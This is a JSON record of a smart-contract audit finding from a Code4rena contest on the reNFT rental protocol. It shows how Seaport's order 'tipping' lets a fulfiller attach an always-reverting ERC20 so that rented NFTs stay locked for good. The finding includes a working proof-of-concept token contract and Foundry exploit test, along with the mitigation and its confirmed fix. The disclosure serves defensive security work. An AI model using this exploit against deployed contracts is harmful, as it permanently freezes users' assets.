{
  "Title": "[H-01] All orders can be hijacked to lock rental assets forever by tipping a malicious ERC20",
  "Content": "\nThe `Create` contract is responsible for creating a rental. It achieves this by acting as a Seaport `Zone`, and storing and validating orders as rentals when they are fulfilled on Seaport.\n\nHowever, one thing it doesn't account for is the fact that Seaport allows for \"tipping\" in the form of ERC20 tokens as part of the order fulfillment process. This is done by extending the `consideration` array in the order with additional ERC20 tokens.\n\nFrom the Seaport [docs](https://docs.opensea.io/reference/seaport-overview#order) (emphasis mine):\n\n> The `consideration` contains an array of items that must be received in order to fulfill the order. It contains all of the same components as an offered item, and additionally includes a `recipient` that will receive each item. This array **may be extended by the fulfiller on order fulfillment so as to support \"tipping\"** (e.g. relayer or referral payments).\n\nThis other passage, while discussing a different issue, even highlights the root cause of this vulnerability (the zone does not properly allocate consideration extensions):\n\n> As extensions to the consideration array on fulfillment (i.e. \"tipping\") can be arbitrarily set by the caller, fulfillments where all matched orders have already been signed for or validated can be frontrun on submission, with the frontrunner modifying any tips. Therefore, it is important that orders fulfilled in this manner either leverage \"restricted\" order types with a **zone that enforces appropriate allocation of consideration extensions**, or that each offer item is fully spent and each consideration item is appropriately declared on order creation.\n\nLet's dive in and see how tipping works exactly. We know fulfillers may use the entry points listed [here](https://github.com/code-423n4/2024-01-renft/blob/75e7b44af9482b760aa4da59bc776929d1e022b0/docs/fulfilling-a-rental.md#overview), the first of which is simply a wrapper to [`_validateAndFulfillAdvancedOrder()`](https://github.com/re-nft/seaport-core/blob/3bccb8e1da43cbd9925e97cf59cb17c25d1eaf95/src/lib/OrderFulfiller.sol#L78C14-L78C46). This function calls [`_validateOrderAndUpdateStatus()`](https://github.com/re-nft/seaport-core/blob/3bccb8e1da43cbd9925e97cf59cb17c25d1eaf95/src/lib/OrderValidator.sol#L135) , which derives the order hash by calling [`_assertConsiderationLengthAndGetOrderHash()`](https://github.com/ProjectOpenSea/seaport-core/blob/main/src/lib/Assertions.sol#L69). At the end of the trail, we can see that the order hash is finally derived in [`_deriveOrderHash()`](https://github.com/ProjectOpenSea/seaport-core/blob/main/src/lib/GettersAndDerivers.sol#L64) from other order parameters as well as the consideration array, but [only up to](https://github.com/ProjectOpenSea/seaport-core/blob/main/src/lib/GettersAndDerivers.sol#L142)  the `totalOriginalConsiderationItems` value in the `parameters` of the [`AdvancedOrder`](https://github.com/ProjectOpenSea/seaport-types/blob/25bae8ddfa8709e5c51ab429fe06024e46a18f15/src/lib/ConsiderationStructs.sol#L174) passed by the fulfiller as argument. This value reflects the original length of the consideration items in the order. <br><https://github.com/ProjectOpenSea/seaport-types/blob/25bae8ddfa8709e5c51ab429fe06024e46a18f15/src/lib/ConsiderationStructs.sol#L143-L156>\n\n```solidity\nstruct OrderParameters {\n    address offerer; // 0x00\n    address zone; // 0x20\n    OfferItem[] offer; // 0x40\n    ConsiderationItem[] consideration; // 0x60\n    OrderType orderType; // 0x80\n    uint256 startTime; // 0xa0\n    uint256 endTime; // 0xc0\n    bytes32 zoneHash; // 0xe0\n    uint256 salt; // 0x100\n    bytes32 conduitKey; // 0x120\n    uint256 totalOriginalConsiderationItems; // 0x140\n    // offer.length                          // 0x160\n}\n```\n\nThus we can see that when deriving the order hash the extra consideration items are ignored, which is what allows the original signature of the offerer to match. However, in the [`ZoneParameters`](https://github.com/re-nft/seaport-core/blob/3bccb8e1da43cbd9925e97cf59cb17c25d1eaf95/src/lib/rental/ConsiderationStructs.sol#L21) passed on to the zone, all consideration items are included in one array, and there is no obvious way to distinguish tips from original items:\n\n```solidity\nstruct ZoneParameters {\n    bytes32 orderHash;\n    address fulfiller;\n    address offerer;\n    SpentItem[] offer;\n    ReceivedItem[] consideration;\n    // the next struct member is only available in the project's fork\n    ReceivedItem[] totalExecutions;\n    bytes extraData;\n    bytes32[] orderHashes;\n    uint256 startTime;\n    uint256 endTime;\n    bytes32 zoneHash;\n}\n```\n\nFinally, while the `validateOrder()` function in the `Create` contract verifies that the order fulfillment has been signed by the reNFT signer, the signed `RentPayload` does not depend on the consideration items, hence tipping is still possible.\n\nThe vulnerability arises when this capability is exploited to add a malicious ERC20 token to the `consideration` array. This malicious token can be designed to revert on transfer, causing the rental stop process to fail. As a result, the rented assets remain locked in the rental safe indefinitely.\n\n### Proof of Concept\n\nWe can validate the vulnerability through an additional test case for the `Rent.t.sol` test file. This test case will simulate the exploit scenario and confirm the issue by performing the following actions:\n\n1.  Create a `BASE` order with Alice as the offerer.\n2.  Finalize the order creation.\n3.  Create an order fulfillment with Bob as the fulfiller.\n4.  Append a malicious ERC20 token to the `consideration` array of the order.\n5.  Finalize the order fulfillment.\n6.  Attempt to stop the rent, which will fail due to the revert on transfer from the escrow.\n\nA simple exploit contract could look as follows:\n\n```solidity\npragma solidity ^0.8.20;\n\nimport {ERC20} from \"@openzeppelin-contracts/token/ERC20/ERC20.sol\";\n\n// This mock ERC20 will always revert on `transfer`\ncontract MockRevertOnTransferERC20 is ERC20 {\n    constructor() ERC20(\"MockAlwaysRevertERC20\", \"M_AR_ERC20\") {}\n\n    function mint(address to, uint256 amount) public {\n        _mint(to, amount);\n    }\n\n    function burn(address to, uint256 amount) public {\n        _burn(to, amount);\n    }\n\n    function transfer(address, uint256) public pure override returns (bool) {\n        require(false, \"transfer() revert\");\n        return false;\n    }\n}\n```\n\nAnd the test:\n\n<details>\n\n```solidity\nimport {\n    Order,\n    OrderParameters,\n    ConsiderationItem,\n    ItemType,\n    FulfillmentComponent,\n    Fulfillment,\n    ItemType as SeaportItemType\n} from \"@seaport-types/lib/ConsiderationStructs.sol\";\nimport {MockRevertOnTransferERC20} from \"@test/mocks/tokens/weird/MockRevertOnTransferERC20.sol\";\n\n    function test_Vuln_OrderHijackingByTippingMaliciousERC20() public {\n        // create a BASE order\n        createOrder({\n            offerer: alice,\n            orderType: OrderType.BASE,\n            erc721Offers: 1,\n            erc1155Offers: 0,\n            erc20Offers: 0,\n            erc721Considerations: 0,\n            erc1155Considerations: 0,\n            erc20Considerations: 1\n        });\n\n        // finalize the order creation\n        (\n            Order memory order,\n            bytes32 orderHash,\n            OrderMetadata memory metadata\n        ) = finalizeOrder();\n\n        // create an order fulfillment\n        createOrderFulfillment({\n            _fulfiller: bob,\n            order: order,\n            orderHash: orderHash,\n            metadata: metadata\n        });\n        // ------- Identical to existing \"test_Success_Rent_BaseOrder_ERC721\" until here -------\n        \n        MockRevertOnTransferERC20 exploitErc20 = new MockRevertOnTransferERC20();\n        // Seaport enforces non-zero quantities + approvals\n        exploitErc20.mint(bob.addr, 100);\n        vm.prank(bob.addr);\n        exploitErc20.approve(address(conduit), type(uint256).max);\n\n        // we acccess baseOrder.advancedOrder and add a consideration item\n        OrderParameters storage params = ordersToFulfill[0].advancedOrder.parameters;\n        params.consideration.push(ConsiderationItem({\n            itemType: ItemType.ERC20,\n            token: address(exploitErc20),\n            identifierOrCriteria: 0,\n            startAmount: 100,\n            endAmount: 100,\n            recipient: payable(address(ESCRW))\n        }));\n\n        // finalize the base order fulfillment\n        RentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();\n\n        // speed up in time past the rental expiration\n        vm.warp(block.timestamp + 750);\n\n        // rental cannot be stopped since transfer from escrow will always revert\n        vm.prank(bob.addr);\n        vm.expectRevert(\n            abi.encodeWithSelector(\n                Errors.PaymentEscrowModule_PaymentTransferFailed.selector,\n                exploitErc20,\n                alice.addr,\n                100\n            )\n        );\n        stop.stopRent(rentalOrder);\n    }\n```\n\n</details>\n\nTo run the exploit test:\n\n*   Save the exploit contract as `test/mocks/tokens/weird/MockRevertOnTransferERC20.sol`.\n*   Add the test to the `Rent.t.sol` test file and run it using the command `forge test --mt test_Vuln_OrderHijackingByTippingMaliciousERC20`. This will run the test above, which should demonstrate the exploit by successfully appending a malicious ERC20 to an existing order and starting a rental that cannot be stopped.\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nDisallow tipping, either by removing this functionality in the Seaport fork or, if this isn't possible, perhaps by adding the size of the consideration items to the `ZoneParameters` and reverting if there are more. This would prevent the addition of malicious ERC20 tokens to the `consideration` array, thereby preventing the hijacking of orders and the indefinite locking of rented assets in the rental safe.\n\n**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/614#issuecomment-1922071817)**\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/7) - Implements a whitelist so only granted assets can be used in the protocol.<br>\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/17) - Implements batching functionality for whitelisting tokens so that multiple can be added at once.\n\n**Status:** Mitigation confirmed. Full details in reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/2), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/41) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/30).\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2024-01-renft",
  "Code": [
    {
      "filename": "docs/fulfilling-a-rental.md",
      "content": "## Fulfilling a Rental\n\n### Overview\n\nFulfilling a rental order involves interacting with one of Seaport's fulfillment functions to process a signed order. The fulfillment functions used can be found [here](https://github.com/re-nft/seaport-core/blob/3bccb8e1da43cbd9925e97cf59cb17c25d1eaf95/src/lib/Consideration.sol), and are listed below for convenience: \n- `fulfillAdvancedOrder`\n- `fulfillAvailableAdvancedOrders`\n- `matchAdvancedOrders`\n\n\n### Calling a Fulfillment Function\n\nSigned orders can be fulfilled by the protocol in a few ways depending on how many orders are being filled at once, and what type of orders are being fulfilled. \n\n`BASE` orders: A single `BASE` order can be fulfilled using `fulfillAdvancedOrder()`. Multiple `BASE` orders can be fulfilled using `fulfillAvailabeAdvancedOrders()`.\n\n`PAY` orders: Both single and multiple `PAY` orders can be fulfilled using Seaport's `matchAdvancedOrders()`.\n\nFor examples of order fulfillment, you can look at the test engine code [here](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/test/fixtures/engine/OrderFulfiller.sol).\n\n### Emitted Rental Order Data\n\nAfter a rental order is created, only the hash of the `RentalOrder` struct is saved in storage. The rest of the data is emitted in the following event: \n\n```\n/**\n * @dev Emitted when a new rental order is started. PAYEE orders are excluded from\n *      emitting this event.\n *\n * @param orderHash        Hash of the rental order struct.\n * @param emittedExtraData Data passed to the order to be emitted as an event.\n * @param seaportOrderHash Order hash of the seaport order struct.\n * @param items            Items in the rental order.\n * @param hooks            Hooks defined for the rental order.\n * @param orderType        Order type of the rental.\n * @param lender           Lender EOA of the assets in the order.\n * @param renter           Renter EOA of the assets in the order.\n * @param rentalWallet     Wallet contract which holds the rented assets.\n * @param startTimestamp   Timestamp which marks the start of the rental.\n * @param endTimestamp     Timestamp which marks the end of the rental.\n*/\nevent RentalOrderStarted(\n    bytes32 orderHash,\n    bytes emittedExtraData,\n    bytes32 seaportOrderHash,\n    Item[] items,\n    Hook[] hooks,\n    OrderType orderType,\n    address indexed lender,\n    address indexed renter,\n    address rentalWallet,\n    uint256 startTimestamp,\n    uint256 endTimestamp\n);\n```\n\nThis will be enough to manually re-create the rental order off-chain. A fully constructed `RentalOrder` struct will be needed to stop any rental order, and reclaim the assets."
    },
    {
      "filename": "src/lib/rental/ConsiderationStructs.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.17;\n\nimport { ItemType, OrderType } from \"seaport-types/src/lib/ConsiderationEnums.sol\";\n\nimport {\n    ReceivedItem,\n    SpentItem\n} from \"seaport-types/src/lib/ConsiderationStructs.sol\";\nimport {MemoryPointer} from \"seaport-types/src/helpers/PointerLibraries.sol\";\n\nimport { ConduitTransfer } from \"seaport-types/src/conduit/lib/ConduitStructs.sol\";\n\n\n/**\n * @dev Restricted orders are validated post-execution by calling validateOrder\n *      on the zone. This struct provides context about the order fulfillment\n *      and any supplied extraData, as well as all order hashes fulfilled in a\n *      call to a match or fulfillAvailable method.\n */\nstruct ZoneParameters {\n    bytes32 orderHash;\n    address fulfiller;\n    address offerer;\n    SpentItem[] offer;\n    ReceivedItem[] consideration;\n    ReceivedItem[] totalExecutions;\n    bytes extraData;\n    bytes32[] orderHashes;\n    uint256 startTime;\n    uint256 endTime;\n    bytes32 zoneHash;\n}\n\nlibrary StructPointers {\n    function toMemoryPointer(\n        ReceivedItem[] memory obj\n    ) internal pure returns (MemoryPointer ptr) {\n        assembly {\n            ptr := obj\n        }\n    }\n}"
    }
  ]
}